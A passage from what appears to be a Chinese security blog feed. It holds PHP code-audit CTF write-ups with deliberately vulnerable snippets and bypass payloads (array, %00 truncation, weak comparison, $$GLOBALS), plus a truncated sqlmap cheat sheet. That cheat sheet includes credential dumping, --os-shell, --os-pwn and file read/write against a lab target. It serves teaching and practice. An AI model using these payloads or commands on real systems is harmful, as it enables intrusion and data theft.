class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;--&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>strpos()函数查找字符串在另一字符串中第一次出现的位置（区分大小写）</p><p><code>ereg()</code>函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回<code>true</code>，否则返回<code>false</code>。搜索对于字母字符是区分大小写的，ereg()函数在匹配到%00会自动截断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.password=aa%00--<br>2.password[]=<br><span class="hljs-comment">#strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求。ereg()在出错时返回的也是null,null!==false,所以符合要求。</span><br></code></pre></td></tr></table></figure></li><li><h4 id="弱整数类型绕过"><a href="#弱整数类型绕过" class="headerlink" title="弱整数类型绕过"></a>弱整数类型绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>;<br><span class="hljs-variable">$temp</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>is_numeric(<span class="hljs-variable">$temp</span>)?die(<span class="hljs-string">&quot;no numeric&quot;</span>):NULL;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$temp</span>&gt;1336) &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>解析：当比较值数据类型为数组时，大于 int <code>1336</code>，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?password[]<br></code></pre></td></tr></table></figure></li><li><h4 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span>(<span class="hljs-params"><span class="hljs-variable">$temp</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br><span class="hljs-variable">$one</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;1&#x27;</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span><br><span class="hljs-variable">$nine</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;9&#x27;</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span><br><span class="hljs-variable">$number</span> = <span class="hljs-string">&#x27;3735929054&#x27;</span>;<br><span class="hljs-comment">// Check all the input characters!</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$number</span>); <span class="hljs-variable">$i</span>++)<br>&#123;<br><span class="hljs-comment">// Disallow all the digits!</span><br><span class="hljs-variable">$digit</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$temp</span>&#123;<span class="hljs-variable">$i</span>&#125;);<br><span class="hljs-keyword">if</span> ( (<span class="hljs-variable">$digit</span> &gt;= <span class="hljs-variable">$one</span>) &amp;&amp; (<span class="hljs-variable">$digit</span> &lt;= <span class="hljs-variable">$nine</span>) )<br>&#123;<br><span class="hljs-comment">// Aha, digit not allowed!</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span> == <span class="hljs-variable">$temp</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">noother_says_correct</span>(<span class="hljs-variable">$temp</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解析：<br>ord — 返回字符的 ASCII 码值可以理解为将数16进制一哈。<br>而此题要求判断的就是将数据 pasword 和要求的number比较，但是又不能出现1-9的数字，比较的方法就是将number的数字进行16进制转换后和输入的值挨个比较。相同即可跳出flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?password=<span class="hljs-number">0xdeadc0de</span><br></code></pre></td></tr></table></figure></li><li><h4 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;xxx&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;-&#x27;</span>) !== <span class="hljs-literal">FALSE</span>) <span class="hljs-comment">//strpos — 查找字符串首次出现的位置</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;-have not been found&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解析：</p><ol><li>ereg() 正则限制了password格式，只能是一个或者多个数字、大小写字母</li><li>strpos() 查找某字符串在另一字符串中第一次出现的位置（区分大小写），本题中需要匹配到”<em>-</em>“才能输出flag</li></ol><ul><li><p><strong>解题方法1</strong>：利用数组绕过这两个函数<br><code>ereg() </code>只能处理字符串，而password是数组，所以返回的是null，三个等号的时候不会进行类型转换。所以<code>null!==false。</code></p><p><code>strpos()</code> 的参数同样不能够是数组，所以返回的依旧是null，<code>null!==false</code>也正确。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload： password[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p><strong>解题方法2</strong>：%00截断绕过正则匹配<br>同时判断输入值是不是长度&lt;8且 &gt;9999999 并且还要包含<code>*_*</code><br>此时使用科学计数法绕过。1e9%00*-*</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload：password=<span class="hljs-number">1e9</span>%<span class="hljs-number">00</span>*-*<br></code></pre></td></tr></table></figure></li></ul></li><li><h4 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;KEY&#123;********************************&#125;&#x27;</span>;<br><span class="hljs-variable">$IM</span>= <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]), <span class="hljs-variable">$match</span>);<br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$IM</span> )&#123; <br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;key is: &#x27;</span>.<span class="hljs-variable">$key</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">.                                 匹配除 <span class="hljs-string">&quot;\n&quot;</span> 之外的任何单个字符<br><br>*                                 匹配它前面的表达式<span class="hljs-number">0</span>次或多次，等价于&#123;<span class="hljs-number">0</span>,&#125;<br><br>&#123;<span class="hljs-number">4</span>,<span class="hljs-number">7</span>&#125;                             最少匹配 <span class="hljs-number">4</span> 次且最多匹配 <span class="hljs-number">7</span> 次，结合前面的 . 也就是匹配 <span class="hljs-number">4</span> 到 <span class="hljs-number">7</span> 个任意字符<br><br>\/                                匹配 / ，这里的 \ 是为了转义<br><br>[a-z]                             匹配所有小写字母<br><br>[:punct:]                         匹配任何标点符号<br><br>/i                                表示不分大小写<br>  <br> /key 就是匹配普通字符串key <br> .*key:对key进行贪婪匹配，如aaakey，abcdkey都会被匹配成key<br> .&#123;<span class="hljs-number">4</span>,<span class="hljs-number">7</span>&#125;:最少匹配 <span class="hljs-number">4</span>次且最多匹配 <span class="hljs-number">7</span> 次,但是前面有了“.”，所以完整意义是最少匹配 <span class="hljs-number">4</span>次且最多匹配 <span class="hljs-number">7</span> 次任意字符。<br> key:都是普通字符<br> \/:标记/为原意字符<br> .:匹配任意字符除换行符\n<br>（）:标记一个子表达式的开始和结束位置<br> [a-z]:匹配所有小写字母中的一个<br> [[:punct:]]:匹配任意标点符号<br> /i:不区分大小写<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">keyabcdkeyaaaakey:/a/abcdkeya;<br>keyabddkeyaaaaakey:/a/abckeya;<br>keyakeyaaaakey:/a/akeya;<br>等<br></code></pre></td></tr></table></figure></li><li><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误报告</span><br><br><span class="hljs-keyword">include</span><span class="hljs-string">&quot;flag1.php&quot;</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(_file_);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]))<span class="hljs-comment">// isset函数判断变量是否存在，是则返回true</span><br><br>&#123; <span class="hljs-variable">$args</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]; <span class="hljs-comment">//通过get请求获取args</span><br><br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,<span class="hljs-variable">$args</span>));<span class="hljs-comment">//利用正则匹配，检测args中的内容</span><br><br>  &#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);&#125;<br><br> <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>)<span class="hljs-comment">//var_dump会输出一个或者多个表达式的类型和值，eval函数会将字符串当成php代码来执行</span><br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>尝试了一下直接复制args&#x3D;flag1.php，但是因为在preg_match()函数中，匹配的是\w，也就是字母字符以及下划线，所以输出了 args error!</p><p>有两个$符号，这里可以做个小小的例子：可以简单理解，把这个东西想象成二级指针</p><p>如果$a&#x3D;’hello’,$hello&#x3D;world,那么$$a&#x3D;world</p><p>所以在做替换的时候，如果args&#x3D;flag，那么最后的结果就是eval(var_dump($flag);，也难怪系统输出了null</p><p>在看一遍题目，没有了其他的提示，我们只能猜测是使用了全局变量，尝试一下 args&#x3D;GLOBALS,我们的结果就出来了</p></li></ul><h2 id="PHP-弱类型总结"><a href="#PHP-弱类型总结" class="headerlink" title="PHP 弱类型总结"></a>PHP 弱类型总结</h2><p>php中有两种比较的符号 &#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$a</span> = <span class="hljs-variable">$b</span> ;<br>  <span class="hljs-variable">$a</span>===<span class="hljs-variable">$b</span> ;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;&#x3D; 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p><p>&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span><br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span><br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span><br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span><br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true</span><br><span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//上述代码可自行测试</span><br></code></pre></td></tr></table></figure><p> 观察上述代码，”admin”&#x3D;&#x3D;0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等<br>2 “1admin”&#x3D;&#x3D;1 比较的时候会将1admin转化成数值,结果为1，而“admin1“&#x3D;&#x3D;1 却等于错误，也就是”admin1”被转化成了0,为什么呢？？<br>3 “0e123456”&#x3D;&#x3D;”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p><p>当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值 值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php代码审计</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap使用</title>
    <link href="/2024/01/08/sqlmap%E4%BD%BF%E7%94%A8/sqlmap%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/01/08/sqlmap%E4%BD%BF%E7%94%A8/sqlmap%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sqlmap是⼀个⾃动化的SQL注⼊⼯具，其主要功能是扫描，发现并利⽤给定的URL进⾏SQL 注⼊。⽬前⽀持的数据库有MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等</p><p>Sqlmap采⽤了以下5种独特的SQL注⼊技术</p><ul><li>基于布尔类型的盲注，即可以根据返回⻚⾯判断条件真假的注⼊</li><li>基于时间的盲注，即不能根据⻚⾯返回的内容判断任何信息，要⽤条件语句查看时间延迟 语句是否已经执⾏(即⻚⾯返回时间是否增加)来判断</li><li>基于报错注⼊，即⻚⾯会返回错误信息，或者把注⼊的语句的结果直接返回到⻚⾯中</li><li>联合查询注⼊，在可以使⽤Union的情况下注⼊</li><li>堆查询注⼊，可以同时执⾏多条语句时的注⼊</li></ul><p>Sqlmap的强⼤的功能包括 数据库指纹识别、数据库枚举、数据提取、访问⽬标⽂件系统，并 在获取完全的操作权限时执⾏任意命令。</p><h2 id="Sqlmap的简单⽤法"><a href="#Sqlmap的简单⽤法" class="headerlink" title="Sqlmap的简单⽤法"></a>Sqlmap的简单⽤法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r http.txt <span class="hljs-comment">#http.txt是我们抓取的http的请求包</span><br>sqlmap -r http.txt -p username <span class="hljs-comment">#指定参数，当有多个参数⽽你⼜知道username参数</span><br>存在SQL漏洞，你就可以使⽤-p指定参数进⾏探测<br>sqlmap -u <span class="hljs-string">&quot;http://www.xx.com/username/admin*&quot;</span> <span class="hljs-comment">#如果我们已经知道admin这⾥是注⼊点的话，可以在其后⾯加个*来让sqlmap对其注⼊</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> <span class="hljs-comment">#探测该url是否存在漏洞</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --cookie=<span class="hljs-string">&quot;抓取的cookie&quot;</span> <span class="hljs-comment">#当该⽹站需要登录时，探测该url是否存在漏洞</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --data=<span class="hljs-string">&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;</span> <span class="hljs-comment">#抓取其post提交的数据填⼊</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --<span class="hljs-built_in">users</span> <span class="hljs-comment">#查看数据库的所有⽤户</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --passwords <span class="hljs-comment">#查看数据库⽤户名的密码有时候使⽤ --passwords 不能获取到密码，则可以试下</span><br>-D mysql -T user -C host,user,password --dump 当MySQL&lt; 5.7时<br>-D mysql -T user -C host,user,authentication_string --dump 当MySQL&gt;=<br>5.7时<br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --current-user <span class="hljs-comment">#查看数据库当前的⽤户</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --is-dba <span class="hljs-comment">#判断当前⽤户是否有管理员权限</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --roles <span class="hljs-comment">#列出数据库所有管理员⻆⾊，仅适⽤于oracle数据库的时候</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --dbs <span class="hljs-comment">#爆出所有的数据库</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --tables <span class="hljs-comment">#爆出所有的数据表</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --columns <span class="hljs-comment">#爆出数据库中所有的列</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --current-db <span class="hljs-comment">#查看当前的数据库</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security --tables <span class="hljs-comment">#爆出数据库security中的所有的表</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security -T <span class="hljs-built_in">users</span> --columns <span class="hljs-comment">#爆出security数据库中users表中的所有的列</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security -T <span class="hljs-built_in">users</span> -C username --dump <span class="hljs-comment">#爆出数据库security中的users表中的username列中的所有数据</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security -T <span class="hljs-built_in">users</span> -C username --dump --start 1 --stop 100 <span class="hljs-comment">#爆出数据库security中的users表中的username列中的前100条数据</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security -T <span class="hljs-built_in">users</span> --dump-all <span class="hljs-comment">#爆出数据库security中的users表中的所有数据</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security --dump-all<span class="hljs-comment">#爆出数据库security中的所有数据</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --dump-all <span class="hljs-comment">#爆出该数据库中的所有数据</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --tamper=space2comment.py <span class="hljs-comment">#指定脚本进⾏过滤，⽤/**/代替空格</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --level=5 --risk=3 <span class="hljs-comment">#探测等级5，平台危险等级3，都是最⾼级别。当level=2时，会测试cookie注⼊。当level=3时，会测试user-agent/referer注⼊。</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --sql-shell <span class="hljs-comment">#执⾏指定的sql语句</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --os-shell/--os-cmd<span class="hljs-comment">#执⾏--os-shell命令，获取⽬标服务器权限</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --os-pwn <span class="hljs-comment">#执⾏--ospwn命令，将⽬标权限弹到MSF上</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --file-read<span class="hljs-string">&quot;c:/test.txt&quot;</span> <span class="hljs-comment">#读取⽬标服务器C盘下的test.txt⽂件</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --file-write test.txt --file-dest <span class="hljs-string">&quot;e:/hack.txt&quot;</span> <span class="hljs-comment">#将本地的test.txt⽂件上传到⽬标服务器的E盘下，并且名字为hack.txt</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --dbms=<span class="hljs-string">&quot;MySQL&quot;</span> <span class="hljs-comment">#指定其数据库为mysql其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase,H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, MicrosoftAccess, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle,PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --random-agent <span class="hljs-comment">#使⽤任意的User-Agent爆破</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --proxy=<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span> <span class="hljs-comment">#指定代理当爆破HTTPS⽹站会出现超时的话，可以使⽤参数 --delay=3 --force-ssl</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --technique T <span class="hljs-comment">#指定时间延迟注⼊，这个参数可以指定sqlmap使⽤的探测技术，默认情况下会测试所有的⽅式，当然，我们也可以直接⼿⼯指定。⽀持的探测⽅式如下：</span><br>　　B: Boolean-based blind SQL injection（布尔型注⼊）<br>　　E: Error-based SQL injection（报错型注⼊）<br>　　U: UNION query SQL injection（可联合查询注⼊）<br>　　S: Stacked queries SQL injection（可多语句查询注⼊）<br>　　T: Time-based 